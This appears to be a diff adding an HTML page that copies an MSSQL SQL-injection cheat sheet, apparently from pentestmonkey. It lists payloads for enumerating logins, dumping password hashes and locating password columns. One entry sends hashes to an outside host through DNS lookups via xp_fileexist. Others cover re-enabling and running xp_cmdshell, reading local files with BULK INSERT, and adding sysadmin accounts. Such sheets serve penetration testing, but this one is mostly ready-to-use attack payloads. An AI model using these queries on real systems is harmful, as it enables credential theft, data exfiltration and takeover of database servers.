@@ -1,0 +1,250 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Queries</title>
+</head><body>Some can only be run by admin, marked by * or -priv<br/>
+<br/>
+Version &#09;&#09;&#09;&#09;SELECT @@version<br/>
+Comments &#09;&#09;&#09;SELECT 1 — comment<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; SELECT /*comment*/1</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Current User &#09;&#09;&#09;SELECT user_name();<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT system_user;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT user;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Users &#09;&#09;&#09;SELECT name FROM master..syslogins<br/>
+List Password Hashes*&#09;SELECT name, password FROM master..sysxlogins — priv, mssql 2000;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins — priv, mssql 2000. &nbsp;</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.</li>
+</ul>
+</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name, password_hash FROM master.sys.sql_logins — priv, mssql 2005;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — priv, mssql 2005</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Privileges &#09;&#09;– current privs on a particular object in 2005, 2008<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;–permissions on a user– current privs in 2005, 2008</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘sysadmin’);</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘dbcreator’);</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘bulkadmin’);</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘diskadmin’);</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘processadmin’);</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘serveradmin’);</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘setupadmin’);</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘securityadmin’);</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;– who has a particular priv? 2005, 2008</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE denylogin = 0;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE hasaccess = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE isntname = 0;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE isntgroup = 0;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE sysadmin = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE securityadmin = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE serveradmin = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE setupadmin = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE processadmin = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE diskadmin = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE dbcreator = 1;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE bulkadmin = 1;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List DBA Accounts &#09;&#09;SELECT is_srvrolemember(‘sysadmin’); — is your account a sysadmin? &nbsp;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;returns 1 for true, 0 for false, NULL for invalid role. &nbsp;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;Also try ‘bulkadmin’, ‘systemadmin’ and other values from the documentation</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM master..syslogins WHERE sysadmin = ’1′ — tested on 2005</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Current Database &#09;&#09;SELECT DB_NAME()<br/>
+List Databases &#09;&#09;SELECT name FROM master..sysdatabases;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT DB_NAME(N); — for N = 0, 1, 2, …</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Columns &#09;&#09;&#09;SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Tables &#09;&#09;&#09;SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Find Tables From <br/>
+Column Name &#09;&#09;– NB: This example works only for the current database. &nbsp;If you wan’t to search another db, you need to specify the db name (e.g. &#09;&#09;&#09;&#09;&#09;&#09;replace sysobject with mydb..sysobjects).<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’ — this lists table, column for each column containing the word ‘password’</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Select Nth Row &#09;&#09;SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row<br/>
+Select Nth Char &#09;&#09;SELECT substring(‘abcd’, 3, 1) — returns c<br/>
+Bitwise AND &#09;&#09;&#09;SELECT 6 &amp; 2 — returns 2<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT 6 &amp; 1 — returns 0</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+ASCII Value -&gt; Char &#09;SELECT char(0×41) — returns A<br/>
+Char -&gt; ASCII Value &#09;SELECT ascii(‘A’) – returns 65<br/>
+Casting &#09;&#09;&#09;&#09;SELECT CAST(’1′ as int);<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT CAST(1 as char)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+String Concatenation &#09;SELECT ‘A’ + ‘B’ – returns AB<br/>
+If Statement &#09;&#09;&#09;IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1<br/>
+Case Statement &#09;&#09;SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1<br/>
+Avoiding Quotes &#09;&#09;SELECT char(65)+char(66) — returns AB<br/>
+Time Delay &#09; &#09;&#09;WAITFOR DELAY ’0:0:5′ — pause for 5 seconds<br/>
+Make DNS Requests &#09;declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + &#09;&#09;&#09;&#09;&#09;&#09;‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + ‘-’ +<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + </li>
+<li style="list-style-type: none">‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host. &nbsp;Messy but necessary.</li>
+<li style="list-style-type: none">– Also check out theDNS tunnel feature of sqlninja</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Command Execution* &#09;EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; you may need to reactivate xp_cmdshell first as it’s disabled by default:</li>
+<li style="list-style-type: none">&nbsp; &nbsp;EXEC sp_configure ‘show advanced options’, 1; — priv</li>
+<li style="list-style-type: none">&nbsp; &nbsp;RECONFIGURE; — priv</li>
+<li style="list-style-type: none">&nbsp; &nbsp;EXEC sp_configure ‘xp_cmdshell’, 1; — priv</li>
+<li style="list-style-type: none">&nbsp; &nbsp;RECONFIGURE; — priv</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Local File Access &#09;&#09;CREATE TABLE mydata (line varchar(8000));<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;BULK INSERT mydata FROM ‘c:boot.ini’;</li>
+<li style="list-style-type: none">&nbsp; &nbsp;DROP TABLE mydata;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Hostname, IP Address &#09;SELECT HOST_NAME()<br/>
+Create Users* &#09;&#09;EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a>&nbsp;‘user’, ‘pass’; — priv<br/>
+Drop Users* &#09;&#09;&#09;EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin </a>‘user’; — priv<br/>
+Make User DBA* &#09;&#09;EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a>&nbsp;‘user’, ‘sysadmin; — priv<br/>
+Location of DB files &#09;EXEC sp_helpdb master; –location of master.mdf<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;EXEC sp_helpdb pubs; –location of pubs.mdf</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Default/System <br/>
+Databases &#09;&#09;&#09;northwind<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;model</li>
+<li style="list-style-type: none">&nbsp; &nbsp;msdb</li>
+<li style="list-style-type: none">&nbsp; &nbsp;pubs — not on sql server 2005</li>
+<li style="list-style-type: none">&nbsp; &nbsp;tempdb</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</body></html>
